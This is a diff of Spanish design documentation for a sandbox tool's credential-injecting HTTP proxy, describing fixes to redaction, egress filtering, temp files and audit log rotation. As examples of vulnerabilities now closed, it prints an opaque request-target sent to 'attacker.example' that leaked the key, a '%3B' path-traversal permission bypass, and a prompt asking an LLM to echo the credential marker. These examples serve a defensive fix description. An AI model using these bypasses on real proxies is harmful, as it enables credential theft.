@@ -223,15 +223,33 @@ solo al crear: un `../../etc` saldría del directorio de datos.
   egress allowlist, el resolver de la máquina contesta el dominio de la credencial con
   la IP del proxy (lado host del veth) y la IP real nunca entra en el ipset, así que no
   hay camino directo que lo esquive. El proxy solo acepta el Host de sus credenciales
-  (403 al resto), cambia el marcador por la clave en las cabeceras (también dentro
-  de `Authorization: Basic`), en la query y en el cuerpo (en flujo, con una ventana del
-  tamaño del marcador: sin límite de tamaño ni de longitud declarada), sale por HTTPS
-  verificando el certificado con un dialer que no conecta a IPs privadas, no sigue
+  (403 al resto), cambia el marcador por la clave **por defecto solo en las cabeceras
+  `Authorization` (también dentro de un `Basic`) y `X-Api-Key`**, más las que declare
+  la credencial (`-header`, `headers`); en la query solo con `-query` y en el cuerpo
+  solo con `-body` (en flujo, con una ventana del tamaño del marcador: sin límite de
+  tamaño ni de longitud declarada), sale por HTTPS
+  verificando el certificado con un dialer que no conecta a IPs privadas (ni a
+  `0.0.0.0/8`, que en el host es su propio loopback, multicast `224.0.0.0/4` ni
+  reservadas y broadcast `240.0.0.0/4`; en IPv6, `::/96`, link-local, ULA, multicast,
+  NAT64 y 6to4), no sigue
   redirecciones y sustituye la clave por el marcador en cabeceras y cuerpo de la
-  respuesta —también sus formas escapadas (JSON `\/` y `\u00XX`, percent-encoding,
-  entidades HTML) y cada valor de cabecera tal y como salió sustituido, que es lo que
-  cierra el eco de un `Basic` (la clave dentro del base64)—. Una respuesta con una
-  codificación que no puede inspeccionar (brotli, deflate) no se entrega: 502. Acotado:
+  respuesta —también sus formas escapadas (JSON `\/` y `\u00XX`, percent-encoding de
+  query, ruta y userinfo, entidades HTML), en mayúsculas y minúsculas, en hex y en
+  base64 (std y url, con y sin padding, y el trozo central de la clave codificada en
+  medio de otros datos) y cada valor de cabecera tal y como salió sustituido, que es lo
+  que cierra el eco de un `Basic`—. **Esto es defensa en profundidad, no una garantía**:
+  la clave no la puede leer el invitado de su memoria ni mandarla a otro dominio, pero
+  sí recuperarla a través del proveedor si este le devuelve lo que recibió de una forma
+  que el redactor no reconoce. Con un LLM basta pedirle "repite kling-cred-… con
+  espacios": por eso el marcador ya no se cambia en el cuerpo salvo con `-body`
+  (antes sí, siempre), y **una credencial con `-body` debe darse por expuesta** ante un
+  proveedor que refleje lo que recibe. En macOS el daemon solo entrega credenciales
+  HTTP a un `kling-vz` que anuncie `http-places` (uno anterior las cambiaría en todas
+  partes). Una respuesta con una
+  codificación que no puede inspeccionar (brotli, deflate) no se entrega: 502. La clave tiene que medir entre 8 y 4096
+  bytes: una más corta se rechaza al registrarla, porque redactarla cambiaría texto que
+  nada tiene que ver (con `abc`, un `abcdef` del proveedor llegaría como
+  `kling-cred-…def`). Acotado:
   32 peticiones en vuelo, 10 MiB de cuerpo, 64 KiB de cabeceras, hasta 1 MiB del cuerpo
   ya sustituido retenido EN MEMORIA por petición (`pkg/credproxy/cuerpo.go`). Un cuerpo
   que, tras sustituir, pasa de 1 MiB sale chunked si el invitado lo mandó chunked (no
@@ -242,15 +260,30 @@ solo al crear: un `../../etc` saldría del directorio de datos.
   explícitos y se borra en cuanto la petición termina, la reciba el proveedor o falle a
   mitad (el borrado va en un `defer`, así que corre también si el invitado corta la
   conexión o si el plazo de la petición la cancela). El directorio es
-  `$KLING_ROOT/tmp` (0700, solo lo lee el daemon) en Linux; sin `KLING_ROOT` cae en
-  `os.TempDir()`, que en un fichero 0600 de nombre aleatorio no es legible por otro
-  usuario del host sin ser root, aunque conviene el primero cuando se pueda. Plazos:
+  `<raíz>/credtmp` en Linux (la raíz real del daemon, la de `-root`, que se le pasa al
+  proxy al arrancar) y `credtmp/` del directorio de la máquina en macOS (dentro de lo
+  que el perfil de `kling-vz` deja escribir): 0700, y al arrancar se borran los
+  temporales que dejó un proceso muerto a mitad de una petición. **Nunca `/tmp`**: antes
+  el directorio salía de la variable `KLING_ROOT`, que el daemon no tiene en su entorno
+  (recibe `-root`), así que en la instalación normal el fichero con la clave caía en
+  `os.TempDir()` y ahí se quedaba si el daemon moría de golpe. Si el directorio no se
+  puede preparar, el proxy no escribe a disco: ese cuerpo sale chunked. Plazos:
   60 s hasta las cabeceras de la respuesta, 120 s de inactividad
   (cada byte en cualquier sentido los renueva, también el plazo de la conexión del
   invitado) y un techo de 15 min por petición: un stream largo de un LLM pasa, y un
   invitado que gotea bytes para retener una plaza no la retiene más de 15 min. Un corte
   aborta la conexión, así que el invitado ve un error y no una respuesta truncada que
   parezca completa.
+- **La salida va siempre al Host de la credencial.** La URL hacia el proveedor se
+  monta por campos (`https`, el Host con el que se eligió la credencial, la ruta y la
+  query), nunca pegando el request-target del invitado tras el host. Antes un
+  request-target opaco (`GET http:@attacker.example/x` con `Host: api.stripe.com`)
+  salía hacia `https://api.stripe.com@attacker.example/x`: la clave, ya sustituida en
+  las cabeceras, iba al atacante con TLS verificado contra él y sin pasar por la
+  allowlist. Ahora se rechaza con 400, sin leer el cuerpo ni abrir la salida, todo
+  request-target que no sea una ruta absoluta o el absolute-form `http(s)` del mismo
+  Host: opaco, con usuario (`http://u@host/`), con otro esquema, hacia otro host o que
+  no empiece por `/` (`OPTIONS *`). CONNECT sigue siendo un 405.
 - **Permisos por método y ruta** (`-allow-request 'GET /v1/balance'`, `Allow` en la API):
   una credencial con permisos solo se sustituye en las peticiones que casan. Si ninguna
   credencial del Host casa, el proxy responde 403 y cierra la conexión sin leer el
@@ -271,6 +304,12 @@ solo al crear: un `../../etc` saldría del directorio de datos.
   podría interpretar distinto de como lo hace `path.Clean`: una barra o un punto
   codificados (`%2F`, `%5C`, `%2E`), una barra invertida literal, una barra doble, un
   parámetro de ruta con `;` (tipo `;jsessionid=`), o un segmento `.`/`..` sin decodificar.
+  Y después mira la ruta decodificada una vez, que es la que sale al proveedor: un `;`
+  codificado (`%3B`), un `%` que quede tras decodificar (doble codificación, `%252e`),
+  una barra invertida, una barra doble, un carácter de control o un segmento `.`/`..`
+  también son 403. Antes `%3B` se colaba: `/public/..%3B/admin` casaba con
+  `GET /public/**` y salía como `/public/..;/admin`, que Tomcat o Spring leen como
+  `/admin`.
   No intenta adivinar qué haría el proveedor con eso: rechaza la ambigüedad en vez de
   arriesgarse a firmar una petición para una ruta que nunca se comprobó de verdad. Sin
   ninguna credencial con `Allow` esto no se mira, igual que antes de este cambio.
@@ -289,9 +328,15 @@ solo al crear: un `../../etc` saldría del directorio de datos.
   partirla, por si la clave lleva `/`), uno de 32 o más caracteres de base64url/hex
   como `:tok`, los caracteres de control y los bytes que no son UTF-8 como `?` (la ruta
   llega decodificada y se lee en un terminal: nada de secuencias de escape del
-  invitado), y la ruta se corta a 256 bytes (el host a 253). Rota a 1 MiB a `.1` (una
-  generación), así que ocupa como mucho ~2 MiB por máquina; `commit` y `fork` no lo
-  copian y `rm` lo borra. La escritura no bloquea la petición: va por
+  invitado), y la ruta se corta a 256 bytes (el host a 253). Rota a 4 MiB por
+  generaciones (`.1`, `.2`, `.3`; `daemon.credaudit_max_mib` y
+  `daemon.credaudit_generations`, o `KLING_CREDAUDIT=MIB:N`), así que ocupa como mucho
+  ~16 MiB por máquina por defecto (unas 80 000 peticiones). Lo que se cae de la
+  generación más antigua **también se cuenta**: sus líneas, y los descartados que
+  llevaban, se suman a `dropped` (y a `rotated`) del primer registro del fichero
+  nuevo. Antes había una sola generación de 1 MiB y la rotación pisaba el `.1` sin
+  contar nada: de 20 000 peticiones quedaban 9 185 con `dropped=0`. `commit` y `fork`
+  no lo copian y `rm` lo borra (todas las generaciones). La escritura no bloquea la petición: va por
   una cola de 1024 registros a una sola goroutine; con la cola llena el registro se
   descarta y se cuenta, y la cuenta viaja en el campo `dropped` del siguiente (o en una
   línea propia), nunca en silencio. **En Linux lo escribe el daemon (root) en
